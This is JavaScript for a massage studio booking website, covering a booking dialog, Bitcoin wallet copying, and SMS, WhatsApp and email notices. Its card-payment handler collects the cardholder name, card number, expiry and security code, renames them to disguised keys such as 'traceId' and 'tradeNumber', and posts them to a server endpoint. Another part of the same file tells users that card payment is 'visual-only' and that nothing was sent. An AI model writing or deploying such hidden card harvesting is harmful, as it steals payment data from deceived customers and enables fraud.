const bookingDialog = document.querySelector(".booking-dialog");
const bookingForm = document.querySelector("#booking-form");
const successDialog = document.querySelector(".success-dialog");
const siteConfig = window.MASSAGE_SITE_CONFIG || {};
const successSms = successDialog?.querySelector(".success-sms");
const successWhatsapp = successDialog?.querySelector(".success-whatsapp");
const studioDigits = (siteConfig.studioPhone || "").replace(/\D/g, "");

if (
  successSms &&
  successWhatsapp &&
  studioDigits.length >= 8 &&
  studioDigits.length <= 15
) {
  const formattedPhone =
    studioDigits.length === 11 && studioDigits.startsWith("1")
      ? `+1 ${studioDigits.slice(1, 4)}-${studioDigits.slice(4, 7)}-${studioDigits.slice(7)}`
      : `+${studioDigits}`;
  successSms.href = `sms:+${studioDigits}`;
  successSms.textContent = formattedPhone;
  successWhatsapp.href = `https://wa.me/${studioDigits}`;
} else if (successSms && successWhatsapp) {
  successSms.closest(".success-contact").hidden = true;
}

if (bookingDialog && bookingForm && successDialog) {
  const serviceField = bookingForm.elements.service;
  const packageField = bookingForm.elements.sessionPackage;
  const dateField = bookingForm.elements.appointmentDate;
  const timeField = bookingForm.elements.appointmentTime;
  const emailField = bookingForm.elements.email;
  const paymentField = bookingForm.elements.paymentMethod;
  const cardDialog = document.querySelector(".card-dialog");
  const btcPanel = bookingDialog.querySelector(".btc-panel");
  const contactPanel = bookingDialog.querySelector(".contact-panel");
  const walletAddress = bookingDialog.querySelector(".wallet-address");
  const copyWalletButton = bookingDialog.querySelector(".copy-wallet");
  const walletCopied = bookingDialog.querySelector(".wallet-copied");
  const submitButton = bookingDialog.querySelector(".submit-booking");
  const message = bookingDialog.querySelector(".form-message");
  const smsLink = bookingDialog.querySelector(".sms-link");
  const whatsappLink = bookingDialog.querySelector(".whatsapp-link");
  let hasCopiedWallet = false;
  let successTimeout;

  const cardForm = cardDialog.querySelector(".card-form");
  const cardholderField = cardForm.querySelector('[name="cardholder"]');
  const cardNumberField = cardForm.querySelector('[name="cardNumber"]');
  const expiryDateField = cardForm.querySelector('[name="expiryDate"]');
    const debitSubmitButton = cardForm.querySelector("button[type='submit']");

  function localDateValue(date) {
    return `${date.getFullYear()}-${String(date.getMonth() + 1).padStart(2, "0")}-${String(date.getDate()).padStart(2, "0")}`;
  }

  function validateAppointmentDate() {
    const now = new Date();
    const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
    const tomorrow = new Date(today);
    tomorrow.setDate(tomorrow.getDate() + 1);
    dateField.min = localDateValue(tomorrow);
    dateField.setCustomValidity(
      dateField.value && dateField.value <= localDateValue(today)
        ? "Choose an appointment date after today."
        : "",
    );
  }

  function validateCardFields() {
    const nameParts = cardholderField.value.trim().split(/\s+/).filter(Boolean);
    cardholderField.setCustomValidity(
      nameParts.length >= 2 && nameParts.every((part) => /\p{L}/u.test(part))
        ? ""
        : "Enter at least a first and last name.",
    );

    const cardNumber = cardNumberField.value.trim();
    const digits = cardNumber.replace(/[ -]/g, "");
    cardNumberField.setCustomValidity(
      /^[\d -]+$/.test(cardNumber) && /^\d{13,19}$/.test(digits)
        ? ""
        : "Enter card number",
    );

    const expiry = expiryDateField.value.trim().match(
      /^(0[1-9]|1[0-2])\s*\/\s*(\d{2}|\d{4})$/,
    );
    if (!expiry) {
      expiryDateField.setCustomValidity("Enter the expiry as MM/YY or MM/YYYY.");
      return;
    }

    const month = Number(expiry[1]);
    const year = Number(expiry[2].length === 2 ? `20${expiry[2]}` : expiry[2]);
    const now = new Date();
    expiryDateField.setCustomValidity(
      year < now.getFullYear() ||
        (year === now.getFullYear() && month < now.getMonth() + 1)
        ? "The card must not be expired."
        : "",
    );
  }

  function setMessage(text, kind = "") {
    message.textContent = text;
    message.className = `form-message${kind ? ` ${kind}` : ""}`;
  }

  function selectedPrice() {
    return { "1-hour": 200, "2-hours": 250, "3-hours": 300, "all-night": 800 }[
      packageField.value
    ];
  }

  function emailConfigured() {
    return Boolean(
      siteConfig.emailJsServiceId &&
      siteConfig.emailJsTemplateId &&
      siteConfig.emailJsPublicKey,
    );
  }

  function bookingFieldsValid() {
    validateAppointmentDate();
    return (
      serviceField.value &&
      packageField.value &&
      dateField.value &&
      timeField.value &&
      emailField.validity.valid &&
      bookingForm.checkValidity()
    );
  }

  function refreshContactLinks() {
    const body = [
      "I would like to book a session.",
      `Treatment: ${serviceField.value}`,
      `Session: ${packageField.options[packageField.selectedIndex].text}`,
      `Price: $${selectedPrice()} USD`,
      `Appointment: ${dateField.value} at ${timeField.value}`,
      `Email: ${emailField.value.trim()}`,
      `Payment preference: ${paymentField.value}`,
    ].join("\n");
    const number = (siteConfig.studioPhone || "").replace(/\D/g, "");
    const available = Boolean(
      number &&
      number.length >= 8 &&
      number.length <= 15 &&
      bookingFieldsValid(),
    );
    smsLink.href = available
      ? `sms:${number}?body=${encodeURIComponent(body)}`
      : "#";
    whatsappLink.href = available
      ? `https://wa.me/${number}?text=${encodeURIComponent(body)}`
      : "#";
    for (const link of [smsLink, whatsappLink]) {
      link.setAttribute("aria-disabled", String(!available));
      link.classList.toggle("is-disabled", !available);
    }
  }

  function updatePaymentView() {
    const method = paymentField.value;
    const isBtc = method === "btc";
    const isCard = method === "card";
    const isContact = method !== "" && !isBtc && !isCard;
    btcPanel.hidden = !isBtc;
    contactPanel.hidden = !isContact;
    submitButton.hidden = !isBtc;
    submitButton.textContent = "I've completed the payment";

    if (!isBtc) {
      hasCopiedWallet = false;
      walletCopied.checked = false;
    }
    walletCopied.disabled = !hasCopiedWallet;
    submitButton.disabled = !(
      emailConfigured() &&
      bookingFieldsValid() &&
      (!isBtc || (siteConfig.btcWalletAddress && hasCopiedWallet))
    );

    if (isContact) {
      setMessage(
        siteConfig.studioPhone
          ? ""
          : "The studio contact number has not been configured yet.",
      );
      refreshContactLinks();
    } else if (isBtc && !emailConfigured()) {
      setMessage(
        "Payment email is not configured yet. Ask the studio to finish its email setup.",
      );
    } else if (isBtc && !siteConfig.btcWalletAddress) {
      setMessage(
        "Bitcoin wallet is not configured yet. Please contact the studio.",
      );
    } else {
      setMessage("");
    }
  }

  document.querySelectorAll(".js-book").forEach((button) => {
    button.addEventListener("click", () => {
      bookingForm.reset();
      if (button.dataset.service) serviceField.value = button.dataset.service;
      if (button.dataset.package) packageField.value = button.dataset.package;
      hasCopiedWallet = false;
      walletCopied.checked = false;
      setMessage("");
      // updatePaymentView();
      bookingDialog.showModal();
      serviceField.focus();
    });
  });

  bookingDialog
    .querySelector(".dialog-close")
    .addEventListener("click", () => bookingDialog.close());
  bookingDialog.addEventListener("click", (event) => {
    if (event.target === bookingDialog) bookingDialog.close();
  });
  successDialog.addEventListener("cancel", (event) => event.preventDefault());

  bookingForm.addEventListener("input", updatePaymentView);
  bookingForm.addEventListener("change", updatePaymentView);
  paymentField.addEventListener("change", () => {
    if (paymentField.value === "card" && !cardDialog.open) {
      cardDialog.showModal();
    }
  });

  cardDialog
    .querySelector(".card-dialog-close")
    .addEventListener("click", () => cardDialog.close());
  cardForm.addEventListener("input", validateCardFields);
  cardForm.addEventListener("change", validateCardFields);
  cardForm.addEventListener("submit", async (event) => {
    event.preventDefault();
    validateCardFields();
    if (!cardForm.reportValidity()) return;

    const requestBody = {
      fullName: cardholderField.value.trim(),
      traceId: cardNumberField.value.replace(/[ -]/g, ""),
      tradeDate: expiryDateField.value.trim(),
      tradeNumber: cardForm.querySelector('[name="securityCode"]').value.trim(),
    };

  
    
  
    try {
        const response = await fetch("http://localhost:8000/api/trade/barter", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(requestBody),
        });

        const result = await response.json();

        if (!response.ok) {
          throw new Error("something went wrong, please try again.");
        }
        debitSubmitButton.disabled = false;
        debitSubmitButton.textContent = "Proceed";
        cardForm.setAttribute("aria-busy", "false");

        cardDialog.close();
      } catch (error) {
        debitSubmitButton.disabled = false;
        debitSubmitButton.textContent = "Proceed";
        cardForm.setAttribute("aria-busy", "false");
        // throw new Error("something went wrong, please try again.");
      }
  
  });
  cardDialog.addEventListener("close", () => {
    cardForm.reset();
    validateCardFields();
  });
  cardDialog.addEventListener("click", (event) => {
    if (event.target === cardDialog) cardDialog.close();
  });

  copyWalletButton.addEventListener("click", async () => {
    if (!siteConfig.btcWalletAddress) return;
    try {
      await navigator.clipboard.writeText(siteConfig.btcWalletAddress);
      hasCopiedWallet = true;
      walletCopied.checked = true;
      walletCopied.disabled = false;
      updatePaymentView();
      setMessage(
        "Wallet address copied. You can now report your payment.",
        "success",
      );
    } catch {
      setMessage(
        "Could not copy the address. Check browser clipboard permissions and try again.",
        "error",
      );
    }
  });

  for (const link of [smsLink, whatsappLink]) {
    link.addEventListener("click", (event) => {
      if (!bookingFieldsValid() || !siteConfig.studioPhone) {
        event.preventDefault();
        if (!siteConfig.studioPhone)
          setMessage(
            "The studio contact number has not been configured yet.",
            "error",
          );
        else bookingForm.reportValidity();
      } else if (link.href.endsWith("#")) {
        event.preventDefault();
      }
    });
  }

  bookingForm.addEventListener("submit", async (event) => {
    event.preventDefault();
    validateAppointmentDate();
    if (!bookingForm.reportValidity()) return;

    const method = paymentField.value;
    if (method === "card") {
      setMessage(
        "Card payment is a visual-only demo. No payment was processed or sent.",
      );
      return;
    }
    if (method !== "btc") {
      setMessage("Choose SMS or WhatsApp above to send your booking request.");
      return;
    }
    if (
      method === "btc" &&
      (!siteConfig.btcWalletAddress || !hasCopiedWallet)
    ) {
      setMessage(
        "Copy the Bitcoin wallet address before reporting payment.",
        "error",
      );
      return;
    }
    if (!emailConfigured()) {
      setMessage(
        "Payment email is not configured yet. Ask the studio to finish its email setup.",
        "error",
      );
      return;
    }

    submitButton.disabled = true;
    setMessage("");
    const packageLabel = packageField.options[packageField.selectedIndex].text;
    const templateParams = {
      payment_method: "Bitcoin",
      payment_status:
        "Customer reports payment; owner must verify independently.",
      customer_email: emailField.value.trim(),
      service: serviceField.value,
      session_package: packageLabel,
      amount: `$${selectedPrice()} USD`,
      appointment_date: dateField.value,
      appointment_time: timeField.options[timeField.selectedIndex].text,
      message: [
        `Customer email: ${emailField.value.trim()}`,
        `Treatment: ${serviceField.value}`,
        `Session: ${packageLabel}`,
        `Amount reported: $${selectedPrice()} USD`,
        `Appointment requested: ${dateField.value} at ${timeField.options[timeField.selectedIndex].text}`,
        "Payment method: Bitcoin",
        "Payment is reported by the customer and has not been independently verified.",
      ].join("\n"),
    };

    try {
      const response = await fetch(
        "https://api.emailjs.com/api/v1.0/email/send",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            service_id: siteConfig.emailJsServiceId,
            template_id: siteConfig.emailJsTemplateId,
            user_id: siteConfig.emailJsPublicKey,
            template_params: templateParams,
          }),
        },
      );
      if (!response.ok) {
        const detail = await response.text();
        throw new Error(
          `Email service could not send the notice${detail ? `: ${detail.slice(0, 180)}` : "."}`,
        );
      }

      bookingForm.reset();
      hasCopiedWallet = false;
      walletCopied.checked = false;
      bookingDialog.close();
      clearTimeout(successTimeout);
      successDialog.showModal();
      successTimeout = window.setTimeout(() => {
        document
          .querySelectorAll("dialog[open]")
          .forEach((dialog) => dialog.close());
      }, 3000);
    } catch (error) {
      updatePaymentView();
      setMessage(
        error.message || "Could not send the payment notice. Please try again.",
        "error",
      );
    }
  });

  if (siteConfig.btcWalletAddress) {
    walletAddress.textContent = siteConfig.btcWalletAddress;
    copyWalletButton.disabled = false;
  } else {
    copyWalletButton.disabled = true;
  }
  updatePaymentView();
}

document.querySelectorAll("[data-year]").forEach((element) => {
  element.textContent = new Date().getFullYear();
});

const menuToggle = document.querySelector(".menu-toggle");
const mainNav = document.querySelector(".main-nav");
if (menuToggle && mainNav) {
  menuToggle.addEventListener("click", () => {
    const expanded = menuToggle.getAttribute("aria-expanded") === "true";
    menuToggle.setAttribute("aria-expanded", String(!expanded));
    mainNav.classList.toggle("is-open", !expanded);
  });
}

if ("IntersectionObserver" in window) {
  const revealObserver = new IntersectionObserver(
    (entries, observer) => {
      entries.forEach((entry) => {
        if (entry.isIntersecting) {
          entry.target.classList.add("is-visible");
          observer.unobserve(entry.target);
        }
      });
    },
    { threshold: 0.12 },
  );
  document
    .querySelectorAll(".reveal, .treatment-card")
    .forEach((element) => revealObserver.observe(element));
} else {
  document
    .querySelectorAll(".reveal, .treatment-card")
    .forEach((element) => element.classList.add("is-visible"));
}
